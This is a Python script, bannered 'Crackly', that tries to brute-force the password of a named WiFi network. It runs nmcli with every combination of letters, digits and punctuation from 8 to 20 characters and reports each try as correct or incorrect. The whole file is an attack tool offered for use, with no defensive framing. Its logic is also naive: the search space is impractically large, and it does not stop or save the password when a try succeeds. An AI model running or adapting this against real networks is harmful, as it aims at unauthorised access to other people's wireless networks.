import sys
import subprocess
import shlex
import time
import itertools
import string

def is_wifi_password_correct(ssid, password, timeout=5):
    # Command to connect to WiFi network using provided SSID and password
    cmd = f"nmcli device wifi connect '{ssid}' password '{password}'"

    # Attempt to connect to WiFi network with timeout
    start_time = time.time()
    process = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    while True:
        if process.poll() is not None:
            break
        
        if time.time() - start_time > timeout:
            process.terminate()
            process.communicate()  # Wait for process to terminate
            return False  # Return False if timeout is reached
        
        time.sleep(0.1)  # Check every 0.1 second
    
    # Check if connection was successful (you may need to customize this check based on your system)
    output, _ = process.communicate()
    if b"successfully activated" in output:
        return True
    else:
        return False

# Usage example
if __name__ == "__main__":

    print("")

    print("  _____                _    _       ")
    print(" / ____|              | |  | |      ")
    print("| |     _ __ __ _  ___| | _| |_   _ ")
    print("| |    | '__/ _` |/ __| |/ / | | | |")
    print("| |____| | | (_| | (__|   <| | |_| |")
    print(" \_____|_|  \__,_|\___|_|\_\_|\__, |")
    print("                               __/ |")
    print("                              |___/ ")

    print("")
    print("")


    if len(sys.argv) < 2:
        print("Usage: python script.py <SSID>")
        sys.exit(1)

    ssid = sys.argv[1]
    timeout = 2  # Timeout in seconds

    all_chars = string.ascii_letters + string.digits + string.punctuation

    for length in range(8, 21):  # Start at 8 characters and end at 20 characters (inclusive)
        for combo in itertools.product(all_chars, repeat=length):
            password = ''.join(combo)
            # Try the password here, such as attempting to connect to a service with it
            print(f"trying {password}")

            if is_wifi_password_correct(ssid, password, timeout):
                print("The WiFi password is correct.")
            else:
                print("The WiFi password is incorrect.")
